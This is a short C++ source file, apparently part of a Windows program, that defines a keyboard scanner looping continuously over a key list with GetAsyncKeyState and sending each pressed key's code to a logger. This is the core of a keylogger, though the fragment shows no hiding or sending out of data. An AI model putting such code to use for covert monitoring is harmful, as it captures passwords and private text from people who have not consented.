#include "pch.h"
#include "keyscan.h"

keyscan::keyscan(logging* logger) {
	m_logger = logger;
}

//Keyboard scanner
void keyscan::scan() {
	while (true) {
		Sleep(1);
		for (auto KEY : skeys::k) {
			if (GetAsyncKeyState(KEY) == -32767) {
				uint8_t code = getcode(KEY);
				if (code != 0x00) m_logger->log(code);
			}
		}
	}
}
